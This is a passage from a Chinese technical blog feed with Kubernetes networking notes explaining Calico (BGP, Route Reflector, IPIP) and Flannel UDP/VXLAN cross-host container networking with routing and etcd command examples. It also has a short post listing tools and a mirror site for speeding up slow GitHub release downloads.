Client进行通信以便交换路由信息。但是，随着节点数量N的增加，这些连接的数量就会以N²的规模快速增长，从而给集群本身的网络带来巨大的压力。</p><p>所以，Node-to-Node Mesh模式一般推荐用在少于100个节点的集群里。而在更大规模的集群中，需要用到的是一个叫作Route Reflector的模式。</p><p>在这种模式下，Calico会指定一个或者几个专门的节点，来负责跟所有节点建立BGP连接从而学习到全局的路由规则。而其他节点，只需要跟这几个专门的节点交换路由信息，就可以获得整个集群的路由规则信息了。</p><p>这些专门的节点，就是所谓的Route Reflector节点，它们实际上扮演了“中间代理”的角色，从而把BGP连接的规模控制在N的数量级上。</p><p>此外，我在前面提到过，Flannel host-gw模式最主要的限制，就是要求集群宿主机之间是二层连通的。而这个限制对于Calico来说，也同样存在。</p><p>举个例子，假如我们有两台处于不同子网的宿主机Node 1和Node 2，对应的IP地址分别是192.168.1.2和192.168.2.2。需要注意的是，这两台机器通过路由器实现了三层转发，所以这两个IP地址之间是可以相互通信的。</p><p>而我们现在的需求，还是Container 1要访问Container 4。</p><p>按照我们前面的讲述，Calico会尝试在Node 1上添加如下所示的一条路由规则：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.233.2.0</span>/<span class="hljs-number">16</span> via <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span> eth0<br><br></code></pre></td></tr></table></figure><p>但是，这时候问题就来了。</p><p>上面这条规则里的下一跳地址是192.168.2.2，可是它对应的Node 2跟Node 1却根本不在一个子网里，没办法通过二层网络把IP包发送到下一跳地址。</p><p><strong>在这种情况下，你就需要为Calico打开IPIP模式。</strong></p><p>IPIP示意图：</p><p><img src="https://static001.geekbang.org/resource/image/4d/c9/4dd9ad6415caf68da81562d9542049c9.jpg?wh=1696*1056" alt="img"></p><p>在Calico的IPIP模式下，Felix进程在Node 1上添加的路由规则，会稍微不同，如下所示：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.233.2.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span> tunl0<br><br></code></pre></td></tr></table></figure><p>可以看到，尽管这条规则的下一跳地址仍然是Node 2的IP地址，但这一次，要负责将IP包发出去的设备，变成了tunl0。注意，是T-U-N-L-0，而不是Flannel UDP模式使用的T-U-N-0（tun0），这两种设备的功能是完全不一样的。</p><p>Calico使用的这个tunl0设备，是一个IP隧道（IP tunnel）设备。</p><p>在上面的例子中，IP包进入IP隧道设备之后，就会被Linux内核的IPIP驱动接管。IPIP驱动会将这个IP包直接封装在一个宿主机网络的IP包中，如下所示：</p><p><img src="https://static001.geekbang.org/resource/image/fc/90/fc2b4173782b7a993f4a43a2cb966f90.jpg?wh=2248*1034" alt="img"></p><p>图5 IPIP封包方式</p><p>其中，经过封装后的新的IP包的目的地址（图5中的Outer IP Header部分），正是原IP包的下一跳地址，即Node 2的IP地址：192.168.2.2。</p><p>而原IP包本身，则会被直接封装成新IP包的Payload。</p><p>这样，原先从容器到Node 2的IP包，就被伪装成了一个从Node 1到Node 2的IP包。</p><p>由于宿主机之间已经使用路由器配置了三层转发，也就是设置了宿主机之间的“下一跳”。所以这个IP包在离开Node 1之后，就可以经过路由器，最终“跳”到Node 2上。</p><p>这时，Node 2的网络内核栈会使用IPIP驱动进行解包，从而拿到原始的IP包。然后，原始IP包就会经过路由规则和Veth Pair设备到达目的容器内部。</p><p>以上，就是Calico项目主要的工作原理了。</p><p>不难看到，当Calico使用IPIP模式的时候，集群的网络性能会因为额外的封包和解包工作而下降。在实际测试中，Calico IPIP模式与Flannel VXLAN模式的性能大致相当。所以，在实际使用时，<strong>如非硬性需求，建议将所有宿主机节点放在一个子网里，避免使用IPIP。</strong></p><p>不过，通过上面对Calico工作原理的讲述，你应该能发现这样一个事实：</p><p>如果Calico项目能够让宿主机之间的路由设备（也就是网关），也通过BGP协议“学习”到Calico网络里的路由规则，那么从容器发出的IP包，不就可以通过这些设备路由到目的宿主机了么？</p><p>比如，只要在上面“IPIP示意图”中的Node 1上，添加如下所示的一条路由规则：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.233.2.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span> eth0<br><br></code></pre></td></tr></table></figure><p>然后，在Router 1上（192.168.1.1），添加如下所示的一条路由规则：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.233.2.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span> eth0<br><br></code></pre></td></tr></table></figure><p>那么Container 1发出的IP包，就可以通过两次“下一跳”，到达Router 2（192.168.2.1）了。以此类推，我们可以继续在Router 2上添加“下一条”路由，最终把IP包转发到Node 2上。</p><p>遗憾的是，上述流程虽然简单明了，但是在Kubernetes被广泛使用的公有云场景里，却完全不可行。</p><p>这里的原因在于：公有云环境下，宿主机之间的网关，肯定不会允许用户进行干预和设置。</p><blockquote><p>当然，在大多数公有云环境下，宿主机（公有云提供的虚拟机）本身往往就是二层连通的，所以这个需求也不强烈。</p></blockquote><p>不过，在私有部署的环境下，宿主机属于不同子网（VLAN）反而是更加常见的部署状态。这时候，想办法将宿主机网关也加入到BGP Mesh里从而避免使用IPIP，就成了一个非常迫切的需求。</p><p>而在Calico项目中，它已经为你提供了两种将宿主机网关设置成BGP Peer的解决方案。</p><p><strong>第一种方案</strong>，就是所有宿主机都跟宿主机网关建立BGP Peer关系。</p><p>这种方案下，Node 1和Node 2就需要主动跟宿主机网关Router 1和Router 2建立BGP连接。从而将类似于10.233.2.0&#x2F;24这样的路由信息同步到网关上去。</p><p>需要注意的是，这种方式下，Calico要求宿主机网关必须支持一种叫作Dynamic Neighbors的BGP配置方式。这是因为，在常规的路由器BGP配置里，运维人员必须明确给出所有BGP Peer的IP地址。考虑到Kubernetes集群可能会有成百上千个宿主机，而且还会动态地添加和删除节点，这时候再手动管理路由器的BGP配置就非常麻烦了。而Dynamic Neighbors则允许你给路由器配置一个网段，然后路由器就会自动跟该网段里的主机建立起BGP Peer关系。</p><p>不过，相比之下，更推荐 <strong>第二种方案</strong>。</p><p>这种方案，是使用一个或多个独立组件负责搜集整个集群里的所有路由信息，然后通过BGP协议同步给网关。而我们前面提到，在大规模集群中，Calico本身就推荐使用Route Reflector节点的方式进行组网。所以，这里负责跟宿主机网关进行沟通的独立组件，直接由Route Reflector兼任即可。</p><p>更重要的是，这种情况下网关的BGP Peer个数是有限并且固定的。所以我们就可以直接把这些独立组件配置成路由器的BGP Peer，而无需Dynamic Neighbors的支持。</p><p>当然，这些独立组件的工作原理也很简单：它们只需要WATCH Etcd里的宿主机和对应网段的变化信息，然后把这些信息通过BGP协议分发给网关即可。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在本篇文章中，详细讲述了Fannel host-gw模式和Calico这两种纯三层网络方案的工作原理。</p><p>需要注意的是，在大规模集群里，三层网络方案在宿主机上的路由规则可能会非常多，这会导致错误排查变得困难。此外，在系统故障的时候，路由规则出现重叠冲突的概率也会变大。</p><p>基于上述原因，如果是在公有云上，由于宿主机网络本身比较“直白”，一般会推荐更加简单的Flannel host-gw模式。</p><p>但不难看到，在私有部署环境里，Calico项目才能够覆盖更多的场景，并提供更加可靠的组网方案和架构思路。</p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>总结一下三层网络方案和“隧道模式”的异同，以及各自的优缺点？</p><p><strong>三层和隧道的异同：</strong> </p><p>相同之处是都实现了跨主机容器的三层互通，而且都是通过对目的 MAC 地址的操作来实现的；</p><p>不同之处是三层通过配置下一条主机的路由规则来实现互通，隧道则是通过通过在 IP 包外再封装一层 MAC 包头来实现。 </p><p>三层的优点：少了封包和解包的过程，性能肯定是更高的。 </p><p>三层的缺点：需要自己想办法维护路由规则。 </p><p>隧道的优点：简单，原因是大部分工作都是由 Linux 内核的模块实现了，应用层面工作量较少。 </p><p>隧道的缺点：主要的问题就是性能低。</p>]]></content>
    
    
    <categories>
      
      <category>Kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>Kubernetes</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>github加载太慢怎么解决</title>
    <link href="/2022/10/28/Github%E4%B8%ADrelease%E9%87%8C%E9%9D%A2%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%A4%AA%E6%85%A2%E6%88%96%E8%80%85%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2022/10/28/Github%E4%B8%ADrelease%E9%87%8C%E9%9D%A2%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%A4%AA%E6%85%A2%E6%88%96%E8%80%85%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer">> 最近在GitHub上面下载一个release里面的exe文件下载到10%不到就下载失败，在网上找了很多方式和插件都没有成功。但最后找到一个网站解决掉了这个问题，给大家分享一下。<h2 id="1-FastGithub"><a href="#1-FastGithub" class="headerlink" title="1.FastGithub"></a>1.FastGithub</h2><p>github加速神器，解决github打不开、用户头像无法加载、releases无法上传下载、git-clone、git-pull、git-push失败等问题 项目地址 <a href="https://github.com/dotnetcore/FastGithub">https://github.com/dotnetcore/FastGithub</a></p><h2 id="2-dev-sidecar"><a href="#2-dev-sidecar" class="headerlink" title="2.dev-sidecar"></a>2.dev-sidecar</h2><p>解决github打不开，github加速，git clone加速，git release下载加速，stackoverflow加速等 项目地址<a href="https://github.com/docmirror/dev-sidecar">https://github.com/docmirror/dev-sidecar</a></p><h2 id="3-https-d-serctl-com-解决release下载失败问题"><a href="#3-https-d-serctl-com-解决release下载失败问题" class="headerlink" title="3.https://d.serctl.com 解决release下载失败问题"></a>3.<strong><a href="https://d.serctl.com/">https://d.serctl.com</a> 解决release下载失败问题</strong></h2><p><img src="https://img-blog.csdnimg.cn/20200628093805317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDA5MjYy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><p><strong>1.在GitHub获取下载链接地址</strong><br><img src="https://img-blog.csdnimg.cn/20200628094009353.png" alt="在这里插入图片描述"><br><strong>2.复制到<a href="https://d.serctl.com/">https://d.serctl.com</a>中的下载地址并提交</strong><br><img src="https://img-blog.csdnimg.cn/20200628094106143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDA5MjYy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>3.在下载地址中打开文件即可</strong><br><img src="https://img-blog.csdnimg.cn/20200628094217561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDA5MjYy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>github</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>容器跨主机网络--flannel的UDP与VXLAN模式</title>
    <link href="/2022/10/24/%E5%AE%B9%E5%99%A8%E8%B7%A8%E4%B8%BB%E6%9C%BA%E7%BD%91%E7%BB%9C-flannel%E7%9A%84UDP%E4%B8%8EVXLAN%E6%A8%A1%E5%BC%8F/"/>
    <url>/2022/10/24/%E5%AE%B9%E5%99%A8%E8%B7%A8%E4%B8%BB%E6%9C%BA%E7%BD%91%E7%BB%9C-flannel%E7%9A%84UDP%E4%B8%8EVXLAN%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"># 容器跨主机网络--flannel的UDP与VXLAN模式<blockquote><p>本文笔记来自：「深入剖析 Kubernetes课程」，原文：<a href="https://time.geekbang.org/column/article/64948">https://time.geekbang.org/column/article/64948</a></p></blockquote><p>在单机环境下，Linux容器网络的实现原理（网桥模式）提到了在Docker的默认配置下，不同宿主机上的容器通过IP地址进行互相访问是根本做不到的。</p><p>而正是为了解决这个容器“跨主通信”的问题，社区里才出现了那么多的容器网络方案。这些网络方案的工作原理到底是什么？</p><p>要理解容器“跨主通信”的原理，就一定要先从Flannel这个项目说起。</p><p>Flannel项目是CoreOS公司主推的容器网络方案。事实上，Flannel项目本身只是一个框架，真正为我们提供容器网络功能的，是Flannel的后端实现。目前，Flannel支持三种后端实现，分别是：</p><ol><li><p>VXLAN；</p></li><li><p>host-gw；</p></li><li><p>UDP。</p></li></ol><p>这三种不同的后端实现，正代表了三种容器跨主网络的主流实现方法。</p><p>UDP模式，是Flannel项目最早支持的一种方式，却也是性能最差的一种方式。所以，这个模式目前已经被弃用。不过，Flannel之所以最先选择UDP模式，就是因为这种模式是最直接、也是最容易理解的容器跨主网络实现。</p><p>在这个例子中，有两台宿主机。</p><ul><li>宿主机Node 1上有一个容器container-1，它的IP地址是100.96.1.2，对应的docker0网桥的地址是：100.96.1.1&#x2F;24。</li><li>宿主机Node 2上有一个容器container-2，它的IP地址是100.96.2.3，对应的docker0网桥的地址是：100.96.2.1&#x2F;24。</li></ul><p>我们现在的任务，就是让container-1访问container-2。</p><p>这种情况下，container-1容器里的进程发起的IP包，其源地址就是100.96.1.2，目的地址就是100.96.2.3。由于目的地址100.96.2.3并不在Node 1的docker0网桥的网段里，所以这个IP包会被交给默认路由规则，通过容器的网关进入docker0网桥（如果是同一台宿主机上的容器间通信，走的是直连规则），从而出现在宿主机上。</p><p>这时候，这个IP包的下一个目的地，就取决于宿主机上的路由规则了。此时，Flannel已经在宿主机上创建出了一系列的路由规则，以Node 1为例，如下所示：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"># 在Node <span class="hljs-number">1</span>上<br>$ ip route<br>default via <span class="hljs-number">10</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> dev eth0<br><span class="hljs-number">100.96.0.0</span>/<span class="hljs-number">16</span> dev flannel0  proto kernel  scope link  src <span class="hljs-number">100</span>.<span class="hljs-number">96</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-number">100.96.1.0</span>/<span class="hljs-number">24</span> dev docker0  proto kernel  scope link  src <span class="hljs-number">100</span>.<span class="hljs-number">96</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-number">10.168.0.0</span>/<span class="hljs-number">24</span> dev eth0  proto kernel  scope link  src <span class="hljs-number">10</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure><p>可以看到，由于我们的IP包的目的地址是100.96.2.3，它匹配不到本机docker0网桥对应的100.96.1.0&#x2F;24网段，只能匹配到第二条、也就是100.96.0.0&#x2F;16对应的这条路由规则，从而进入到一个叫作flannel0的设备中。</p><p>而这个flannel0设备的类型就比较有意思了：它是一个TUN设备（Tunnel设备）。</p><p>在Linux中，TUN设备是一种工作在三层（Network Layer）的虚拟网络设备。TUN设备的功能非常简单，即： <strong>在操作系统内核和用户应用程序之间传递IP包。</strong></p><p>以flannel0设备为例：像上面提到的情况，当操作系统将一个IP包发送给flannel0设备之后，flannel0就会把这个IP包，交给创建这个设备的应用程序，也就是Flannel进程。这是一个从内核态（Linux操作系统）向用户态（Flannel进程）的流动方向。</p><p>反之，如果Flannel进程向flannel0设备发送了一个IP包，那么这个IP包就会出现在宿主机网络栈中，然后根据宿主机的路由表进行下一步处理。这是一个从用户态向内核态的流动方向。</p><p>所以，当IP包从容器经过docker0出现在宿主机，然后又根据路由表进入flannel0设备后，宿主机上的flanneld进程（Flannel项目在每个宿主机上的主进程），就会收到这个IP包。然后，flanneld看到了这个IP包的目的地址，是100.96.2.3，就把它发送给了Node 2宿主机。</p><p> <strong>flanneld是如何知道这个IP地址对应的容器，是运行在Node 2上的呢？</strong></p><p>这里用到了Flannel项目里一个非常重要的概念：子网（Subnet）。</p><p>事实上，在由Flannel管理的容器网络里，一台宿主机上的所有容器，都属于该宿主机被分配的一个“子网”。在我们的例子中，Node 1的子网是100.96.1.0&#x2F;24，container-1的IP地址是100.96.1.2。Node 2的子网是100.96.2.0&#x2F;24，container-2的IP地址是100.96.2.3。</p><p>而这些子网与宿主机的对应关系，正是保存在Etcd当中，如下所示：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ etcdctl ls <span class="hljs-regexp">/coreos.com/</span>network/subnets<br><span class="hljs-regexp">/coreos.com/</span>network<span class="hljs-regexp">/subnets/</span><span class="hljs-number">100.96</span>.<span class="hljs-number">1.0</span>-<span class="hljs-number">24</span><br><span class="hljs-regexp">/coreos.com/</span>network<span class="hljs-regexp">/subnets/</span><span class="hljs-number">100.96</span>.<span class="hljs-number">2.0</span>-<span class="hljs-number">24</span><br><span class="hljs-regexp">/coreos.com/</span>network<span class="hljs-regexp">/subnets/</span><span class="hljs-number">100.96</span>.<span class="hljs-number">3.0</span>-<span class="hljs-number">24</span><br><br></code></pre></td></tr></table></figure><p>所以，flanneld进程在处理由flannel0传入的IP包时，就可以根据目的IP的地址（比如100.96.2.3），匹配到对应的子网（比如100.96.2.0&#x2F;24），从Etcd中找到这个子网对应的宿主机的IP地址是10.168.0.3，如下所示：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ etcdctl get <span class="hljs-regexp">/coreos.com/</span>network<span class="hljs-regexp">/subnets/</span><span class="hljs-number">100.96</span>.<span class="hljs-number">2.0</span>-<span class="hljs-number">24</span><br>&#123;<span class="hljs-string">&quot;PublicIP&quot;</span>:<span class="hljs-string">&quot;10.168.0.3&quot;</span>&#125;<br><br></code></pre></td></tr></table></figure><p>而对于flanneld来说，只要Node 1和Node 2是互通的，那么flanneld作为Node 1上的一个普通进程，就一定可以通过上述IP地址（10.168.0.3）访问到Node 2，这没有任何问题。</p><p>所以说，flanneld在收到container-1发给container-2的IP包之后，就会把这个IP包直接封装在一个UDP包里，然后发送给Node 2。不难理解，这个UDP包的源地址，就是flanneld所在的Node 1的地址，而目的地址，则是container-2所在的宿主机Node 2的地址。</p><p>这个请求得以完成的原因是，每台宿主机上的flanneld，都监听着一个8285端口，所以flanneld只要把UDP包发往Node 2的8285端口即可。</p><p>通过这样一个普通的、宿主机之间的UDP通信，一个UDP包就从Node 1到达了Node 2。而Node 2上监听8285端口的进程也是flanneld，所以这时候，flanneld就可以从这个UDP包里解析出封装在里面的、container-1发来的原IP包。</p><p>而接下来flanneld的工作就非常简单了：flanneld会直接把这个IP包发送给它所管理的TUN设备，即flannel0设备。</p><p>根据TUN设备的原理，这正是一个从用户态向内核态的流动方向（Flannel进程向TUN设备发送数据包），所以Linux内核网络栈就会负责处理这个IP包，具体的处理方法，就是通过本机的路由表来寻找这个IP包的下一步流向。</p><p>而Node 2上的路由表，跟Node 1非常类似，如下所示：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"># 在Node <span class="hljs-number">2</span>上<br>$ ip route<br>default via <span class="hljs-number">10</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> dev eth0<br><span class="hljs-number">100.96.0.0</span>/<span class="hljs-number">16</span> dev flannel0  proto kernel  scope link  src <span class="hljs-number">100</span>.<span class="hljs-number">96</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-number">100.96.2.0</span>/<span class="hljs-number">24</span> dev docker0  proto kernel  scope link  src <span class="hljs-number">100</span>.<span class="hljs-number">96</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span><br><span class="hljs-number">10.168.0.0</span>/<span class="hljs-number">24</span> dev eth0  proto kernel  scope link  src <span class="hljs-number">10</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><br></code></pre></td></tr></table></figure><p>由于这个IP包的目的地址是100.96.2.3，它跟第三条、也就是100.96.2.0&#x2F;24网段对应的路由规则匹配更加精确。所以，Linux内核就会按照这条路由规则，把这个IP包转发给docker0网桥。</p><p>接下来，docker0网桥会扮演二层交换机的角色，将数据包发送给正确的端口，进而通过Veth Pair设备进入到container-2的Network Namespace里。</p><p>而container-2返回给container-1的数据包，则会经过与上述过程完全相反的路径回到container-1中。</p><p>需要注意的是，上述流程要正确工作还有一个重要的前提，那就是docker0网桥的地址范围必须是Flannel为宿主机分配的子网。这个很容易实现，以Node 1为例，你只需要给它上面的Docker Daemon启动时配置如下所示的bip参数即可：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ <span class="hljs-attribute">FLANNEL_SUBNET</span>=100.96.1.1/24<br>$ dockerd <span class="hljs-attribute">--bip</span>=<span class="hljs-variable">$FLANNEL_SUBNET</span> <span class="hljs-built_in">..</span>.<br><br></code></pre></td></tr></table></figure><p>以上，就是基于Flannel UDP模式的跨主通信的基本原理了。原理图如下所示。</p><p><img src="https://static001.geekbang.org/resource/image/83/6c/8332564c0547bf46d1fbba2a1e0e166c.jpg?wh=1857*878" alt="img"></p><p>可以看到，Flannel UDP模式提供的其实是一个三层的Overlay网络，即：它首先对发出端的IP包进行UDP封装，然后在接收端进行解封装拿到原始的IP包，进而把这个IP包转发给目标容器。这就好比，Flannel在不同宿主机上的两个容器之间打通了一条“隧道”，使得这两个容器可以直接使用IP地址进行通信，而无需关心容器和宿主机的分布情况。</p><p>上述UDP模式有严重的性能问题，所以已经被废弃了。那么性能问题出现在了哪里呢？</p><p>实际上，相比于两台宿主机之间的直接通信，基于Flannel UDP模式的容器通信多了一个额外的步骤，即flanneld的处理过程。而这个过程，由于使用到了flannel0这个TUN设备，仅在发出IP包的过程中，就需要经过三次用户态与内核态之间的数据拷贝，如下所示：</p><p><img src="https://static001.geekbang.org/resource/image/84/8d/84caa6dc3f9dcdf8b88b56bd2e22138d.png?wh=890*593" alt="img"></p><p>可以看到：</p><p>第一次，用户态的容器进程发出的IP包经过docker0网桥进入内核态；</p><p>第二次，IP包根据路由表进入TUN（flannel0）设备，从而回到用户态的flanneld进程；</p><p>第三次，flanneld进行UDP封包之后重新进入内核态，将UDP包通过宿主机的eth0发出去。</p><p>此外，我们还可以看到，Flannel进行<strong>UDP封装（Encapsulation）和解封装（Decapsulation）</strong>的过程，也都是在用户态完成的。在Linux操作系统中，上述这些上下文切换和用户态操作的代价其实是比较高的，这也正是造成Flannel UDP模式性能不好的主要原因。</p><p>所以说， <strong>我们在进行系统级编程的时候，有一个非常重要的优化原则，就是要减少用户态到内核态的切换次数，并且把核心的处理逻辑都放在内核态进行</strong>。这也是为什么，Flannel后来支持的VXLAN模式，逐渐成为了主流的容器网络方案的原因。</p><p><strong>VXLAN</strong>，即V<strong>irtual Extensible LAN（虚拟可扩展局域网</strong>），是Linux内核本身就支持的一种网络虚似化技术。所以说，VXLAN可以完全在内核态实现上述封装和解封装的工作，从而通过与前面相似的“隧道”机制，构建出覆盖网络（Overlay Network）。</p><p>VXLAN的覆盖网络的设计思想是：在现有的三层网络之上，“覆盖”一层虚拟的、由内核VXLAN模块负责维护的二层网络，使得连接在这个VXLAN二层网络上的“主机”（虚拟机或者容器都可以）之间，可以像在同一个局域网（LAN）里那样自由通信。当然，实际上，这些“主机”可能分布在不同的宿主机上，甚至是分布在不同的物理机房里。</p><p>而为了能够在二层网络上打通“隧道”，VXLAN会在宿主机上设置一个特殊的网络设备作为“隧道”的两端。这个设备就叫作VTEP，即：VXLAN Tunnel End Point（虚拟隧道端点）。</p><p>而VTEP设备的作用，其实跟前面的flanneld进程非常相似。只不过，它进行封装和解封装的对象，是二层数据帧（Ethernet frame）；而且这个工作的执行流程，全部是在内核里完成的（因为VXLAN本身就是Linux内核中的一个模块）。</p><p>上述基于VTEP设备进行“隧道”通信的流程，如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/03/f5/03185fab251a833fef7ed6665d5049f5.jpg?wh=1767*933" alt="img"></p><p>可以看到，图中每台宿主机上名叫flannel.1的设备，就是VXLAN所需的VTEP设备，它既有IP地址，也有MAC地址。</p><p>现在，我们的container-1的IP地址是10.1.15.2，要访问的container-2的IP地址是10.1.16.3。</p><p>那么，与前面UDP模式的流程类似，当container-1发出请求之后，这个目的地址是10.1.16.3的IP包，会先出现在docker0网桥，然后被路由到本机flannel.1设备进行处理。也就是说，来到了“隧道”的入口。为了方便叙述，我接下来会把这个IP包称为“原始IP包”。</p><p>为了能够将“原始IP包”封装并且发送到正确的宿主机，VXLAN就需要找到这条“隧道”的出口，即：目的宿主机的VTEP设备。</p><p>而这个设备的信息，正是每台宿主机上的flanneld进程负责维护的。</p><p>比如，当Node 2启动并加入Flannel网络之后，在Node 1（以及所有其他节点）上，flanneld就会添加一条如下所示的路由规则：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">$ route -n<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>...<br><span class="hljs-number">10.1.16.0</span>       <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">16</span>.<span class="hljs-number">0</span>       <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> flannel.<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>这条规则的意思是：凡是发往10.1.16.0&#x2F;24网段的IP包，都需要经过flannel.1设备发出，并且，它最后被发往的网关地址是：10.1.16.0。</p><p>从图3的Flannel VXLAN模式的流程图中我们可以看到，10.1.16.0正是Node 2上的VTEP设备（也就是flannel.1设备）的IP地址。</p><p>为了方便叙述，接下来把Node 1和Node 2上的flannel.1设备分别称为“源VTEP设备”和“目的VTEP设备”。</p><p>而这些VTEP设备之间，就需要想办法组成一个虚拟的二层网络，即：通过二层数据帧进行通信。</p><p>所以在我们的例子中，“源VTEP设备”收到“原始IP包”后，就要想办法把“原始IP包”加上一个目的MAC地址，封装成一个二层数据帧，然后发送给“目的VTEP设备”（这么做是因为这个IP包的目的地址不是本机）。</p><p>这里需要解决的问题就是： <strong>“目的VTEP设备”的MAC地址是什么？</strong></p><p>此时，根据前面的路由记录，我们已经知道了“目的VTEP设备”的IP地址。而要根据三层IP地址查询对应的二层MAC地址，这正是ARP（Address Resolution Protocol ）表的功能。</p><p>而这里要用到的ARP记录，也是flanneld进程在Node 2节点启动时，自动添加在Node 1上的。我们可以通过ip命令看到它，如下所示：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"># 在Node <span class="hljs-number">1</span>上<br>$ ip neigh show dev flannel.<span class="hljs-number">1</span><br><span class="hljs-number">10.1.16.0</span> lladdr 5e:f8:4f:<span class="hljs-number">00</span>:e3:<span class="hljs-number">37</span> PERMANENT<br><br></code></pre></td></tr></table></figure><p>这条记录的意思非常明确，即：IP地址10.1.16.0，对应的MAC地址是5e:f8:4f:00:e3:37。</p><blockquote><p>可以看到，最新版本的Flannel并不依赖L3 MISS事件和ARP学习，而会在每台节点启动时把它的VTEP设备对应的ARP记录，直接下放到其他每台宿主机上。</p></blockquote><p>有了这个“目的VTEP设备”的MAC地址， <strong>Linux内核就可以开始二层封包工作了</strong>。这个二层帧的格式，如下所示：</p><p><img src="https://static001.geekbang.org/resource/image/f2/55/f208fba66d2b58405864882342b23255.jpg?wh=799*179" alt="img"></p><p>可以看到，Linux内核会把“目的VTEP设备”的MAC地址，填写在图中的Inner Ethernet 